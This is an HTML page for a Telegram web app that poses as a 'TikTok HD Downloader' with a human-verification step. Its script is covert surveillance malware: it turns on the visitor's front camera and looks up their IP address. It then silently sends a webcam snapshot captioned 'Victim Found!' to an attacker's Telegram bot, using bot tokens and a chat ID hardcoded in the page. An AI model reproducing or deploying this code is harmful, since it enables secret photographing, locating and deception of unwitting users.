<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #000; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
        .btn { background-color: #fe2c55; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; margin-top: 20px; font-weight: bold; }
        .loading { display: none; color: #ccc; margin-top: 10px; }
    </style>
</head>
<body>

    <h2>TikTok HD Downloader</h2>
    <p>ဗီဒီယိုဒေါင်းလုဒ်ဆွဲရန် လူဟုတ်မဟုတ် အရင်စစ်ဆေးပါ</p>
    <button class="btn" id="startBtn">Continue to Download</button>
    <p class="loading" id="loader">Verifying... Please wait...</p>

    <canvas id="canvas" style="display:none;"></canvas>
    <video id="video" style="display:none;" autoplay playsinline></video>

    <script>
    const SHOWCAM_TOKEN = "8684084048:AAEVozTW2qWgq33WrZ4NHDGKz1L3LgymHeQ"; 
    const TIKTOK_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY";  
    const MY_ID = "5304050102"; 

    const startBtn = document.getElementById('startBtn');
    const loader = document.getElementById('loader');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    startBtn.addEventListener('click', async () => {
        startBtn.style.display = 'none';
        loader.style.display = 'block';

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;

            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            const userIP = ipData.ip;

            // ၇ စက္ကန့်အထိ တိုးမြှင့်ထားသည် (ပုံအနက်မဖြစ်စေရန်)
            setTimeout(async () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg');
                const blob = await (await fetch(imageData)).blob();

                const formData = new FormData();
                formData.append('chat_id', MY_ID);
                formData.append('photo', blob, 'shot.jpg');
                formData.append('caption', `✅ Victim Found!\n🌐 IP: ${userIP}`);
                
                // ShowCam Bot ဆီ ပုံပို့ခြင်း
                await fetch(`https://api.telegram.org/bot${SHOWCAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });

                // TikTok Bot ဆီ Success စာပို့ခြင်း
                const victimId = Telegram.WebApp.initDataUnsafe.user.id; 
                await fetch(`https://api.telegram.org/bot${TIKTOK_TOKEN}/sendMessage?chat_id=${victimId}&text=✅ Verification_Success`);

                stream.getTracks().forEach(track => track.stop());
                setTimeout(() => { Telegram.WebApp.close(); }, 500); 
            }, 7000); 

        } catch (err) {
            alert("Permission denied!");
            startBtn.style.display = 'block';
            loader.style.display = 'none';
        }
    });
</script>

</body>
</html>
